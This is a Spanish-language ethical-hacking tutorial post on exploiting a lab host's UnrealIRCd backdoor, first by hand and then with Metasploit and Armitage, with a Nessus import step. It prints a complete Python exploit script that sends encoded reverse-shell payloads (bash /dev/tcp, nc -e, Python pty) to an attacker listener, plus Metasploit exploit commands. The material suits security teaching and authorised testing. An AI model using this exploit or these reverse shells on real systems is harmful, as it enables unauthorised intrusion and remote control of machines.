---
title: Explotación de vulnerabilidades en Hosts
author:
  name: Javier Fernández Santos
  link: https://github.com/JaviFS97
date: 2021-07-04 09:17:00 +0800
categories: [Ciberseguridad, Seguridad Ofensiva]
tags: [Pentesting, Metasploit, Armitage, NMAP, Exploit, Payload]
math: true
mermaid: true
assets_path: /assets/img/posts/20210704

---
Durante los posts anteriores hemos visto métodos para recopilar y analizar información sobre nuestros objetivos. Durante este post veremos como explotar (en Hosts) aquellas vulnerabilidades que presentan.

# Contenido
- [Objetivo](#objetivo)
- [Explotación manual de vulnerabilidades](#explotación-manual-de-vulnerabilidades)
  * [Caso de uso](#caso-de-uso)
- [Explotación automática de vulnerabilidades](#explotación-automática-de-vulnerabilidades)
  * [Metasploit](#metasploit)
    + [Componentes](#componentes)
    + [Módulos](#módulos)
    + [Comandos](#comandos)
    + [Caso de uso](#caso-de-uso-1)
    + [Importando a Metasploit análisis de vulnerabilidades (de Nessus)](#importando-a-metasploit-análisis-de-vulnerabilidades-de-nessus)
  * [Armitage, interfaz gráfica de Metasploit](#armitage-interfaz-gráfica-de-metasploit)

# Objetivo
Consiste en el uso de técnicas que permiten al analista **aprovechar una vulnerabilidad identificada (sección análisis de vulnerabilidades) para obtener algún beneficio**. Se corresponde con una de las fases más importantes e intrusivas del proceso de Hacking Ético. Deben tenerse muy en cuenta las herramientas de protección y detección que utiliza la organización (Antivirus, EDR, IPS, IDS, HIDS, WAF, etc).

Se puede realizar de dos maneras:
 * Explotación manual.
 * Explotación automática.

# Explotación manual de vulnerabilidades
Una vez halladas vulnerabilidades gracias a las fases anteriores, podemos explotar dichas vulnerabilidades de manera manual, para ello debemos seguir los siguientes pasos:
1. Buscar la vulnerabilidad.
2. Buscar/crear el exploit.
3. Incluir un payload en el exploit.
4. Ejecutar el exploit contra la máquina objetivo para intentar ganar acceso.


## Caso de uso
Como ejemplo, vamos a realizar una explotación manual sobre la máquina objetivo usada en fases anteriores. En concreto sobre este servicio, el irc, presente en el puerto 6667 de la máquina objetivo. Podemos observar que hay un backdoor que nos va a permitir ganar acceso a la máquina.
![Vulnerabilidad IRC]({{ page.assets_path}}/ExplotandoVulnerabilidad1.png){: .shadow style="min-width: 70%;" }
_Vulnerabilidad IRC_



Creamos o buscamos un exploit para aprovechar esa vulnerabilidad. En este caso hemos encontrado un exploit en internet con el siguiente código:
```python
#!/usr/bin/python3
import argparse
import socket
import base64

# Sets the target ip and port from argparse
parser = argparse.ArgumentParser()
parser.add_argument('ip', help='target ip')
parser.add_argument('port', help='target port', type=int)
parser.add_argument('-payload', help='set payload type', required=True, choices=['python', 'netcat', 'bash'])
args = parser.parse_args()

# Sets the local ip and port (address and port to listen on)
local_ip = ''  # CHANGE THIS
local_port = ''  # CHANGE THIS 

# The different types of payloads that are supported
python_payload = f'python -c "import os;import pty;import socket;tLnCwQLCel=\'{local_ip}\';EvKOcV={local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');QRRCCltJB.close();" '
bash_payload = f'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'
netcat_payload = f'nc -e /bin/bash {local_ip} {local_port}'

# our socket to interact with and send payload
try:
    s = socket.create_connection((args.ip, args.port))
except socket.error as error:
    print('connection to target failed...')
    print(error)
    
# craft out payload and then it gets base64 encoded
def gen_payload(payload_type):
    base = base64.b64encode(payload_type.encode())
    return f'echo {base.decode()} |base64 -d|/bin/bash'

# all the different payload options to be sent
if args.payload == 'python':
    try:
        s.sendall((f'AB; {gen_payload(python_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')

if args.payload == 'netcat':
    try:
        s.sendall((f'AB; {gen_payload(netcat_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')

if args.payload == 'bash':
    try:
        s.sendall((f'AB; {gen_payload(bash_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')
    
#check display any response from the server
data = s.recv(1024)
s.close()
if data != '':
    print('Exploit sent successfully!')
```

El exploit abre un socket contra la máquina objetivo que indiquemos por parámetros (`exploit.py <ip_objetivo> <puerto_objetivo> -payload <python/netcat/bash>`) y envía un payload con el objetivo de establecer una conexión reversa (reverse shell) con nuestra máquina (establecer las variables local_ip y local_port). Necesitamos colocar un "listener" sobre el puerto que hemos indicado en local_port para que la máquina objetivo establezca conexión. Si usamos netcat sería -> `nc -l -p <local_port>`. Si todo sale de manera satisfactoria, en la misma terminal donde pusimos el listener aparecerá la shell de la máquina objetivo.

_**[IMPORTANTE]**_ --> ¿Por qué existe el mismo payload en distintos lenguajes? No sabemos qué interpretes tiene instalado la máquina destino. Si no tiene instalado el interprete de python no entenderá el payload que le hemos enviado. Por esta razón hay más de uno.


# Explotación automática de vulnerabilidades
La lista de vulnerabilidades de la máquina objetivo recopiladas puede ser muy grande, realizar una explotación manual sobre todas ellas puede llegar a ser tedioso y lento. Por esta razón existen herramientas que se encargan de automatizar esta fase.

## Metasploit
Proyecto Open Source que busca ofrecer herramientas para la creación y ejecución de exploits que aprovechen las vulnerabilidades halladas en las auditorías de seguridad.

A continuación, veremos de forma breve la composición de Metasploit, sus comandos principales y la manera en que podemos utilizarlo.

### Componentes
Metasploit es considerado un framework en el que están integradas un conjunto de herramientas cada una de las cuales nos ofrece una función determinada.

| Componente | Funcionalidad |
| ------------- |-------------|
| msfvenom      | Integra `msfpayload`, que se encarga de la generación de payloads en diferentes lenguajes de programación, y la posibilidad de inyectarlos en otros archivos. También integra `msfencode`, que ofrece ofuscación a payloads.|
| msfd     | Gestor de conexiones remotas de Metasploit. Ofrece un servicio que queda a la escucha en un puerto determinado.|
| msfconsole | Componente que permite la ejecución de `módulos` mediante una interfaz de línea de comandos.|

El que más nos interesa es el último de la lista, msfconsole, ya que es el que nos va a permitir explotar las vulnerabilidades encontradas durante la auditoría.

### Módulos
Un módulo no es más que un código desarrollado para llevar a cabo una o varias acciones determinadas. Dentro de msfconsole disponemos de un importante número de ellos (se van actualizando de manera continua gracias a la comunidad), pero si necesitamos algo más especifico tenemos la posibilidad de programar nosotros mismos el nuestro.

Existen 7 tipos de módulos:

|Nombre módulo| Descripción|
| ------------- |-------------|
|Exploits|Módulos encargados de explotar alguna vulnerabilidad.|
|Auxiliary|Módulos que ofrecen funcionalidades extra. Desde búsqueda pasiva hasta activa.|
|Post|Módulos dedicados a labores post-explotación. Son comunes en este apartado las tareas de mantenimiento de la conexión con la máquina objetivo, el robo periódico de información, el pivoting entre diferentes máquinas o el escalado de privilegios.|
|Payloads|Módulos que realizan acciones determinadas dentro del sistema en el que hemos conseguido penetrar.|
|Encoders|Se encargan de hacer más difíciles de detectar, por antivirus o sistemas de detección de intrusos, los códigos generados mediante otros módulos.|
|NOPs|Contienen herramientas que generar instrucciones NOPs (nulas) en ensamblador para los payloads con los que trabajaremos.|
|Evasion|Permiten llevar a cabo técnicas de evasión ante la protección de los antivirus.|


### Comandos
Hay un conjunto de comandos principales que nos van a permitir comenzar a trabajar con Metasploit. Para empezar nos quedamos con los siguientes:

|Comando| Descripción|
| ------------- |-------------|
|help|Muestra la ayuda de la aplicación.|
|show|Muestra las opciones que tiene aquello sobre lo que se consulta.|
|set|Comando que otorga un valor determinado a un parámetro.|
|setg|La misma función que `set`, pero a nivel global de la aplicación.|
|search|Busca coincidencias sobre aquello que busquemos dentro del contenido de Metasploit.|
|info|Propociona información sobre el módulo que consultemos.|
|save|guarda la configuración que hay en el momento de ejectuarlo. De modo que puede ser recuperada en cualquier momento.|
|use|Indica al framework el módulo que se va a utilizar para que lo cargue en la consola.|
|run|Para ejecutar módulos tipo auxiliary.|
|exploit|Ejecuta el exploit que tengamos cargado en ese momento, con la configuración que hayamos establecido.|
|back|Comando de retroceso durante el uso de Metasploit.|
|check|Evalúa si el host objetivo es vulnerable al módulo que hemos escogido.|
|sessions|Gestor de conexiones abiertas con hosts objetivos. Mediante las opciones del comando podremos ir moviéndonos entre todas las conexiones que tengamos.|

### Caso de uso
Vamos a explotar la vulnerabilidad que explotamos de manera manual en el apartado anterior.

Lo primero que hay que hacer es buscar las coincidencias que haya de la vulnerabilidad `unrealirc` dentro de Metasploit, para ello ejecutamos el comando `search unrealirc`. Obteniendo la siguiente salida:
![Buscando exploit en Metasploit]({{ page.assets_path}}/ExplotandoVulnerabilidadMestasploit1.png){: .shadow style="min-width: 70%;" }
_Buscando exploit en Metasploit_


En este caso solo encuentra un exploit, para usarlo ejecutamos el siguiente comando `use <nombre_módulo>`, en este caso, nombre_módulo = exploit/unix/irc/unreal_ircd_3281_backdoor. Una vez hecho, se entra al módulo para configurarlo (ver que aparece en rojo el módulo que estamos configurando).

Para ver qué hay que configurar del módulo, ejecutar el comando `show options` (con `show advanced` veremos la configuración avanzada), obtendremos la siguiente salida:
![Configurando opciones del exploit en Metasploit]({{ page.assets_path}}/ExplotandoVulnerabilidadMestasploit2.png){: .shadow style="min-width: 70%;" }
_Configurando opciones del exploit en Metasploit_

En este caso nos pide dos parámetros, la ip de la máquina objetivo (RHOSTS) y el puerto (RPORT) que ya viene configurada en el puerto por defecto de ese servicio. Para configurar la ip, ejecutar el comando `set rhosts <ip>`.

Si ahora ejecutamos el exploit mediante el comando `exploit` ejecutará todos los exploit configurados. El problema es que en nuestro caso hemos configurado un exploit pero no hemos definido el payload que va a usar. Por eso obtenemos el siguiente resultado:
![Asignando payload en Metasploit]({{ page.assets_path}}/ExplotandoVulnerabilidadMestasploit3.png){: .shadow style="min-width: 70%;" }
_Asignando payload en Metasploit_


Para añadir un payload al exploit, primero debemos saber cuales son compatibles con nuestro exploit, para ello ejecutamos el comando `show payloads`. Escogemos el que queramos mediante el comando `set payload <payload>`.

Si volvemos a ejecutar el comando `exploit` veremos que todo sale correctamente y obtenemos una shell reversa de la máquina objetivo.

### Importando a Metasploit análisis de vulnerabilidades (de Nessus)
Además de los comandos que vimos anteriormente, Metasploit incorpora otro conjunto de comandos denominados "Database Backend" que permiten recopilar información desde varias fuentes externas y almacenarlas en una base de datos propia para poder utilizarla posteriormente. 

|Comando| Descripción|
| ------------- |-------------|
|db_import|Importa los datos de un fichero a la base de datos de Metasploit.|
|db_export|Exporta el contenido de la base de datos a un fichero.|
|hosts|Muestra todos los objetivos que tenemos en la base de datos.|
|services|Muestra todos los servicios que tenemos en la base de datos.|
|vulns|Muestra todas las vulnerabilidades que hay almacenadas en la base de datos.|


Para obtener los resultados del análisis de Nessus, accedemos a su interfaz gráfica y exportamos en análisis (formato .nessus).
![Análisis realizado en Nessus]({{ page.assets_path}}/ImportandoNessus1.png){: .shadow style="min-width: 70%;" }
_Análisis realizado en Nessus_


Ese archivo (.nessus) es el que vamos a importar en Metasploit por medio del comando `db_import <nombre_fichero>.nessus`.
![Importando análisis de Nessus a Metasploit]({{ page.assets_path}}/ImportandoNessus2.png){: .shadow style="min-width: 70%;" }
_Importando análisis de Nessus a Metasploit_

Si queremos saber qué objetivos tiene nuestro análisis, podemos ejecutar el comando `Hosts`. Si queremos ver qué servicios tiene habilitados un objetivo en concreto, ejecutar el comando `services <ip>`. Si queremos saber las vulnerabilidades que presenta un objetivo, ejecutar el comando `vulns <ip>`.
![Buscando vulnerabilidades halladas en el análisis de Nessus]({{ page.assets_path}}/ImportandoNessus3.png){: .shadow style="min-width: 70%;" }
_Buscando vulnerabilidades halladas en el análisis de Nessus_



## Armitage, interfaz gráfica de Metasploit
Presenta una interfaz gráfica para realizar las mismas acciones que desde la terminal
![Interfaz gráfica Armitage]({{ page.assets_path}}/armitage.png){: .shadow style="min-width: 70%;" }
_Interfaz gráfica Armitage_


Por ejemplo, podemos aprovechar la misma vulnerabilidad que aprovechamos antes (unrealirc). Como se puede observar presenta los mismos parámetros que tuvimos que rellenar en el caso de uso anterior.
![Explotando vulnerabilidad IRC en armitage]({{ page.assets_path}}/armitage2.png){: .shadow style="min-width: 70%;" }
_Explotando vulnerabilidad IRC en armitage_


